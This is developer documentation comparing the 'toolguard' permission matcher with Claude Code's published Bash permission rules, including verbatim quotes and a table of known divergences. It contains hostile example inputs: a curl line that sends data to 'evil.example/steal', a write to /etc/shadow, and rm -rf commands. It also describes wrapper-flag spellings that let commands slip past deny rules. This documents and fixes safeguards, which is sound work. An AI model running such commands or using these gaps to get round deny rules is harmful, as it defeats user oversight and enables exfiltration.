# What `[native]` is supposed to mirror

**Last verified against Claude Code's published documentation: 2026-09-10 -- every quote below re-checked verbatim against that fetch.**
Source: <https://code.claude.com/docs/en/permissions.md> (sections "Wildcard patterns" and "Bash").
Earlier verifications: 2026-08-13, 2026-08-20, 2026-09-08. The wildcard quotes were **replaced** on 2026-09-10 because the page had been rewritten; the assignment and wrapper quotes were unchanged.

toolguard's `[native]` pattern type is defined **by reference to an external, evolving specification** — Claude Code's own builtin permission rules. That means any claim that `[native]` matches native is true only as of a date, and this file carries that date. Everywhere else in our documentation that discusses `[native]` should link here rather than restate the semantics, so there is one place to re-verify.

**Re-verify when Claude Code updates.** The behaviour below is relatively recent: wildcards were once accepted only as a trailing wildcard, and the position-independent form plus the word-boundary rule arrived later. A statement that we match native is a universally quantified claim about a moving target.

---

## Quoted verbatim from Claude Code's documentation

**These five replaced the three sentences this file quoted until 2026-09-10.** Claude Code rewrote its wildcard section some time between 2026-08-20 and 2026-09-08; the replacement is not a rewording, and the two constraints it adds are marked below. This is what the "re-verify when Claude Code updates" instruction is for, and it is the second time the page has moved under this file.

> A `*` in a Bash rule matches any text, including spaces, so one rule covers a family of commands. A rule with no `*` matches one exact command.

> Put the `*` after the subcommand. In `git log --oneline main`, `git` is the program and `log` is the subcommand, the word that determines what the program does. Claude Code matches everything before the first `*` as written, so those words are what limit the rule: `Bash(git log *)` allows only `git log` commands, and `Bash(git *)` allows every git command. Claude Code [warns at startup](https://code.claude.com/docs/en/errors#has-a-wildcard-before-the-rest-of-the-command) about an allow rule with a `*` before the subcommand, such as `Bash(git * main)`.

**New since this file last verified (1 of 2): the startup warning.** Native now warns about `Bash(git * main)` as an allow rule -- a shape this file's own divergence table uses as an example. toolguard emits no such warning; it is a lint on rule shape, not a matching behaviour, so it is not a `[native]` fidelity question. Recorded so a reader is not surprised that Claude Code complains about a rule toolguard accepts silently.

> **The `*` stands in for whatever text is in its place.** In `Bash(git * main)`, it stands in for the subcommand, so Claude Code matches every git subcommand and every option before it. That includes `-c`, which makes git run a program you name. In `Bash(* --version)`, the `*` stands in for the program, so any program matches.

> **A `*` at the end, with a space before it, also matches the bare command.** `Bash(ls *)` matches `ls`, and `Bash(git log *)` matches `git log`. That holds only when the trailing `*` is the rule's only wildcard: `Bash(* --help *)` matches `npm --help x` but not `npm --help`.

**New since this file last verified (2 of 2): the bare-command admission is now conditional.** The sentence itself is not new, but *"That holds only when the trailing `*` is the rule's only wildcard"* is. Divergence rows 18 and 81 below are measured against this wording, not the older unconditional one.

> **The space before a trailing `*` is part of the rule.** `Bash(ls *)` requires a space after `ls`, so `lsof` doesn't match. `Bash(ls*)` has no space, so it matches `lsof` too.

On the `:*` form, from the same page:

> The `:*` suffix is an equivalent way to write a trailing wildcard, so `Bash(ls:*)` matches the same commands as `Bash(ls *)`.

> The `:*` form is only recognized at the end of a pattern. In a pattern like `Bash(git:* push)`, the colon is treated as a literal character and won't match git commands.

And on the bare form:

> `Bash(*)` is equivalent to `Bash` and matches all Bash commands. As a deny rule, both forms remove the tool from Claude's context.

On a leading environment-variable assignment, from the "Wrappers" subsection of the same page (this quote verified 2026-08-20, later than the header date, which covers the quotes above it):

> Claude Code also strips a leading assignment of certain known-safe environment variables, so `Bash(npm test *)` matches `NODE_ENV=test npm test`. An allow rule won't match past an assignment of any other variable. A deny or ask rule matches past any leading assignment, so `Bash(rm *)` in deny still matches `FOO=bar rm -rf tmp/`.

On process wrappers, from the same "Wrappers" subsection (this quote verified 2026-09-08, later than the header date):

> Before matching Bash rules, Claude Code strips a fixed set of wrappers, so a rule like `Bash(npm test *)` also matches `timeout 30 npm test`. The stripped wrappers are `timeout`, `time`, `nice`, `nohup`, and `stdbuf`, plus the shell builtins `command` and `builtin`, and zsh's `noglob`. Each runs its argument as the actual command. Two related forms aren't stripped: the query form `command -v`, which looks up a command rather than running one, and zsh's `nocorrect`.

Note this paragraph states no group distinction, unlike the assignment paragraph above it: wrappers are stripped for allow, ask and deny alike.

---

**toolguard's own behaviour on a bare `:*`/`:**` (no command before it, e.g. `Bash(:*)`).**
Not a native-referenced claim -- Claude Code's docs make none about this shape -- but recorded
here as the one place `:*` semantics are documented. `match_command` treats it as matching an
empty command string, or one starting with a space, rather than raising (verified by
execution: `match_command("", [":*"])` and `match_command(" ls", [":*"])` are both `(True,
":*")`; `match_command("ls", [":*"])` is `(False, None)`). This is a silent fail-open on those
two input shapes, not "matches nothing." It is inert in practice: the PEG command extractor
strips leading whitespace and rejects empty leaves before any command reaches `match_command`,
so no real Bash invocation triggers it -- verified end-to-end via `toolguard.testing.sandbox`,
where an empty or blank leaf is denied upstream ("No valid commands found in command line") and
a leading-space leaf reaches the matcher already stripped.

## Known divergences between toolguard and the above

Recorded here because a reader comparing the two needs them in one place. Each is filed as a proposed ticket with a failing test.

| # | native says | toolguard does |
|---|---|---|
| 17 | `Bash(* install)` matches any command **ending with** ` install` | `[native]*id_rsa` does **not** match `cat id_rsa.pub id_rsa`. The matcher takes the **first** occurrence of the final segment and never backtracks, so the end-anchor check tests the wrong occurrence |
| 18 | `Bash(ls *)` enforces a **word boundary** — matches `ls -la`, not `lsof` | **resolved for the `:*` form** — the boundary is enforced on the whole prefix, so `git log:*` no longer matches `git logfoo`. A trailing `*` still crosses spaces, so `Bash(rm FILE:*)` matches `rm FILE /etc/passwd`, exactly as native does. **A hand-written trailing ` *` pattern still diverges, verified by execution**: a DEFAULT body written as `ls *` (space, no colon) never reaches the boundary-checked branch at all — it is a whole-string `fnmatch` — so `fnmatch('ls', 'ls *')` requires a literal trailing space and does not match bare `ls` (`ls -la` → `True`, `lsof` → `False`, `ls` → `False`), unlike native's stated end-of-string admission. `:*` and a hand-written trailing ` *` are therefore not fully equivalent in toolguard today, only the `:*` form is boundary-checked. **Re-measured 2026-09-10 against the rewritten native wording**, which now admits the bare command only when the trailing `*` is the rule's *only* wildcard: DEFAULT `ls:*` matches bare `ls` (agrees), DEFAULT `ls *` does not (diverges, as above), and `[native]* --help *` correctly refuses bare `npm --help` -- but by never admitting a bare command at all, not by implementing the condition, so that agreement is incidental |
| 18 | `:*` is recognised **only at the end**; `Bash(git:* push)` treats the colon literally | **resolved** -- `match_command` now enters its boundary-checked branch only when a DEFAULT pattern ends in `:*`/`:**`; any other `:` (mid-pattern, or inside a URL like `curl http://ex.com/*`) falls through to a plain `fnmatch`, which treats it as a literal character |
| 19 | Explicit args after a `:` that is not the pattern's trailing `:*` are matched literally, as ordinary text | **bidirectional, not a narrowing** — restricting `:*` recognition to the pattern's literal end (row 18) affects two shapes oppositely. Where a DEFAULT pattern used `:` as an ad-hoc argument separator (e.g. `git commit:-m *`), the old first-colon split is gone: the pattern is now a whole-string `fnmatch`, so it no longer matches `git commit -m x` — **narrowing** a deny written this way (`deny Bash(git push:--force *)` no longer blocks `git push --force origin`) and shrinking an allow written this way. Where a pattern's *own prefix* contains a `:` before its trailing `:*` (e.g. `Bash(curl http://localhost:*)`), the old first-colon split made it match almost nothing; it is now an ordinary boundary-checked prefix and **widens** — verified by execution: `curl http://localhost`, `curl http://localhost -o /etc/shadow` and `curl http://localhost http://evil.example/steal` all went `False` → `True`. This reached `hard_deny`: `configuration.md` published the paired shape `deny = ["Bash(curl:*)"]` / `allow = ["Bash(curl http://localhost:*)"]`, which went from an inert carve-out to one that also exempts a second, unrelated URL argument — a trailing `*` spans arguments the same way in DEFAULT and native alike (the single-`*`-spans-spaces quote above). `agent-guides.md` published only the `allow` half, against a `[hard_deny] deny` list with no `curl` entry, so its example carve-out was inert against that deny list both before and after the colon-recognition change described here (a separate, pre-existing defect -- not this row's finding -- since fixed by adding a matching `curl:*` deny). Both directions are native-faithful. **The actual fix was to stop using `[hard_deny]` for this rule**: `hard_deny` means no exceptions, and a curl carve-out is exactly a rule that needs one. Three successive attempts at a safe-and-usable `[hard_deny]` carve-out (an anchored regex too narrow to be usable, a claim that no pattern works at all, a bounded-flag-set regex still defeated by common flag spellings like `--silent`/`-fsS`/a quoted URL) confirmed this is a property of the mechanism, not of any one pattern. Both recipes now put the curl deny at the ordinary level, where a more-specific `allow` can legitimately override it — see [agent-guides.md](agent-guides.md#recipe-deny-a-command-with-a-legitimate-exception) and [configuration.md](configuration.md#overriding-a-deny-at-a-more-specific-level). A scan of every reachable rule on this machine found 2 real non-trailing-colon rules, neither a deny |
| 81 | `Bash(ls:*)` matches the same commands as `Bash(ls *)` -- the `:*` suffix is an equivalent way to write a trailing wildcard | **`[native]` does not implement `:*` at all.** Measured 2026-09-10 by execution: `[native]git:*` matches neither `git status` nor `git`, and `[native]npm run test:*` matches neither `npm run test` nor `npm run test -- --watch`, while `[native]git *` matches `git status` normally. The colon is left as a literal, so the rule matches only a command that literally contains it. **DEFAULT is unaffected** -- plain `git log:*` handles the shorthand correctly, which is why this went unseen. Exposure measured the same day: **zero** `[native]` rules using `:*` across every toolguard config on this machine (the real shapes in use are `[native]*`, `[native]git*`, `[native]git * main`, `[native]*id_rsa`, `[native]docker * --rm *`). It is not on the migration path either -- migration preserves an existing `[native]` prefix but never adds one, so a rule imported from `settings.local.json` becomes a DEFAULT pattern. **Fix rather than defer**, per `.claude/rules/evidence-before-fixing.md`: zero occurrences, but `:*` is the ordinary spelling in native settings so a hand-written `[native]` conversion reaches it by accident, and on a deny rule the failure is silent forever. Filed as **TOO-81**, which also carries the wider decision: `[native]` has three defects with one cause and zero rules in use anywhere, so the ticket proposes folding it into the unmarked syntax rather than patching it |

Leading `VAR=value` assignments are **engine-wide rather than `[native]`-specific**, so they are documented with the matching engine instead of in the table above. Per the quote above, the two policies have the same shape -- restricting rules match past the prefix, granting rules only for known-safe names -- and differ over the list: native's is Claude Code's own and its members are not named in that documentation, while toolguard's is `assignments_looked_past_when_granting` and starts empty. See [Leading environment assignments](permission-patterns.md#leading-environment-assignments). It is mentioned here because a reader comparing toolguard against the quoted documentation will otherwise not find it.

**Process wrappers are also engine-wide rather than `[native]`-specific, and unlike assignments they have no other home in this documentation -- so the detail lives here.** Measured 2026-09-08 against toolguard 0.7.0, one rule per config, decided by the resulting decision rather than by reading the reason text:

| shape | native | toolguard |
|---|---|---|
| `timeout 30 npm test`, `time npm test`, `nohup npm test`, `stdbuf -oL npm test`, `command npm test`, `builtin npm test`, `noglob npm test`, `nice npm test`, `nice -5 npm test`, `nice -n5 npm test` | stripped | stripped |
| `command -v npm test`, `nocorrect npm test` | **not** stripped | **not** stripped |
| **`nice -n 5 npm test`, `timeout -s TERM 30 npm test`, `timeout -k 5 30 npm test`, `stdbuf -o L npm test`** | stripped | **NOT stripped -- divergence** |

All eight wrappers are recognised, and the same behaviour applies to allow, ask and deny alike. **The divergence is argument parsing, not list membership**: a wrapper flag whose value is a *separate token* is not stepped over, so the scan stops before reaching the inner command. Attached values (`-n5`, `-oL`, `-s9`) and `--long=value` forms work; space-separated values do not. This is the same class `_ExecutorFlags.value_letters` already solves for interpreters, which the wrapper stripper has no equivalent of.

**It fails open on a deny rule** -- `deny = ["Bash(rm *)"]` catches `rm -rf tmp/`, `nice rm -rf tmp/` and `timeout 30 rm -rf tmp/`, but not `nice -n 5 rm -rf tmp/`. Filed as **TOO-80**, with the caveat that the failing spellings (`nice -n 10 <cmd>`, `timeout -k 5 30 <cmd>`) are the standard ones for those flags rather than evasion forms, so the path to it is accidental rather than deliberate.

---

## What this file is not

It is not a specification of toolguard's own DEFAULT, GLOB or REGEX pattern types — those are toolguard's own and are documented in [permission-patterns.md](permission-patterns.md). It covers only `[native]`, and only because `[native]` promises to imitate something we do not control.
